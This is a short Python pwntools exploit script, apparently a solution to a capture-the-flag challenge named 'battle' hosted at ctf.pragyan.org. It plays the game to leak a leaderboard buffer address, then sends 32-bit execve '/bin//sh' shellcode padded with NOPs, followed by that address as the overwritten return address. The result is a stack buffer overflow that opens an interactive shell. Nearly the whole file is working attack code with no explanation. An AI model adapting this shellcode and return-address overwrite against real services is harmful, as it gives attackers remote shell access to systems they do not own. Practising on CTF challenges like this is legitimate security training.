from pwn import *

if __debug__:
	script='''b* 0x80492fb
	c
	'''
	p=gdb.debug('./battle',script)
	# p=process('./battle')
else:
	p=remote('ctf.pragyan.org',12500)
	
for i in range(8):
	p.sendafter('/8\n',"A a\n")

p.sendafter('/8\n',"A ,,,,,,,,0\n")
p.sendafter('/8\n','F\n')
p.sendafter('leaderboard: ','WinnersOnlyAllowed\n')
p.recvuntil('Leaderboard: 0x')
addr=int(p.recv(8),16)
print('leaderboard addr = '+hex(addr))
shellcode='\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80'
dummy='\x90'*(112-len(shellcode))

p.sendafter('/8\n','F\n')
p.sendafter('leaderboard: ',shellcode+dummy+p32(addr)+'\n')
p.interactive()
p.close()